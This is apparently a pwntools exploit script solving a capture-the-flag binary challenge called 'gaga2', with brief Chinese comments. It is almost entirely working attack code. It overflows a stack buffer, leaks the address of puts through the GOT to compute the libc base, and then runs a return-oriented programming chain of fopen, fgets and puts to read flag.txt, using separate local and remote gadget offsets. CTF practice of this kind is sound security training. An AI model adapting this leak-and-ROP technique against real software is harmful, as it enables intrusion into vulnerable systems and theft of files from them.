import sys
from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
elf = context.binary = ELF('./gaga2')

if sys.argv[1] == 'local':
    p = process('./gaga2')
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('challs.actf.co', '31302')
    libc = ELF('./libc.so.6') # 从Dockerfile对应的镜像中复制出来的

pause()

pop_rdi_ret = 0x00000000004012b3
start_addr = 0x004010f0
bss_addr = 0x404070
payload = flat(
    b'a' * 0x48,
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'],
    pop_rdi_ret,
    bss_addr,
    elf.plt['gets'],
    start_addr
)
p.sendlineafter(b'Your input: ', payload)

put_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\0'))
libc.address = put_addr - libc.sym['puts']
p.sendline(b'flag.txt\0r'.ljust(16, b'\0') + p64(libc.sym['fgets']))

system_addr = libc.sym['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
one_gadget_addr = libc.address + 0xc9620
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x004012aa
call_r15_addr = 0x00401290
pop_rsi_r15_ret = 0x00000000004012b1

if sys.argv[1] == 'local':
    # 本地
    mov_offset = [0x18, 0x18]
    mov_rax_rdi = 0x9e5e8 + libc.address # mov qword ptr [rdi + 0x18], rax ; ret
    mov_rdi_rdx = 0xea3e3 + libc.address # mov rdx, qword ptr [rdi + 0x18] ; mov qword ptr [rdi + 0x18], rdx ; ret0
else:
    # 远程
    mov_offset = [0x20, 0x18]
    mov_rax_rdi = 0xb86b0 + libc.address # mov qword ptr [rdi + 0x20], rax ; ret
    mov_rdi_rdx = 0xc8a63 + libc.address # mov rdx, qword ptr [rdi + 0x18] ; mov qword ptr [rdi + 0x18], rdx ; ret

payload = flat(
    b'a' * 0x48,
    pop_rdi_ret,
    bss_addr,
    pop_rsi_r15_ret,
    bss_addr+9,
    0,
    libc.sym['fopen'],
    
    pop_rdi_ret,
    bss_addr+0x20 - mov_offset[0],
    mov_rax_rdi,

    pop_rdi_ret,
    bss_addr+0x20 - mov_offset[1],
    mov_rdi_rdx, # FILE

    pop_rdi_ret,
    bss_addr+0x30, # buffer_addr
    pop_rsi_r15_ret,
    100, # size
    0,
    libc.sym['fgets'],

    pop_rdi_ret,
    bss_addr+0x30,
    elf.plt['puts'],

    # pop_rbx_rbp_r12_r13_r14_r15_ret,
    # 0,
    # 1,
    # bss_addr+0x30, # buffer_addr
    # 100, # size
    # bss_addr+0x20, # FILE
    # bss_addr+0x10, # fgets
    # call_r15_addr,
    # 0,
    # 0,
    # 0,
    # 0,
    # 0,
    # 0,
    # 0,
    # pop_rdi_ret,
    # bss_addr+0x30,
    # elf.plt['puts'],
)

p.sendlineafter(b'Your input: ', payload)

p.interactive()